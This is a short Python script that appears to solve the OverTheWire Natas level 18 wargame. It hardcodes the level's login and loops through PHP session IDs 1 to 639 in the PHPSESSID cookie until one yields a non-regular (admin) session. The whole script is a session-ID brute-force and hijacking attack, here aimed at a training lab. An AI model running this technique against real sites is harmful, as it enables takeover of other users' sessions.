import requests

auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
url  = 'http://natas18.natas.labs.overthewire.org/'
for i in range(1,640):
    cook={'PHPSESSID': str(i)}
    res = requests.get(url,auth=auth,cookies=cook)
    print("Testing " + str(i))
    if 'regular user' not in res.text:
        print("We found it:"+str(i))
        print(res.text)
        break

